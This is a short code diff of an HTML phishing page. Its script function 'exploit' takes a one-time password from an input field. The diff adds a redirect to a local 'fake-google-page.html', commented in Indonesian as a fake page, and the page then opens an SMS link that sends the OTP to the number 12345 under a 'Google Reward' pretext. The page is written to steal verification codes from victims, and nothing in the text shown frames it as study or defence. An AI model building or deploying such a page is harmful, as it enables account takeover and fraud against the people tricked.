@@ -90,7 +90,11 @@
   <script>
     function exploit() {
       var otp = document.getElementById('otp').value;
-      var win = window.open('https://google.com', '', 'noopener,noreferrer');
+      var win = window.open('fake-google-page.html', '', 'noopener,noreferrer'); // Ganti ke halaman lokal
+      if (win) {
+        // Inject pesan ke halaman palsu (harus diatur di fake-google-page.html)
+        // Di sini cuma buka halaman, pesan diatur di file lain
+      }
       setTimeout(function() {
         location.href = `sms:12345&body=Google Reward OTP: ${otp}`;
       }, 2000);
@@ -103,4 +107,3 @@
   </script>
 </body>
 </html>
-
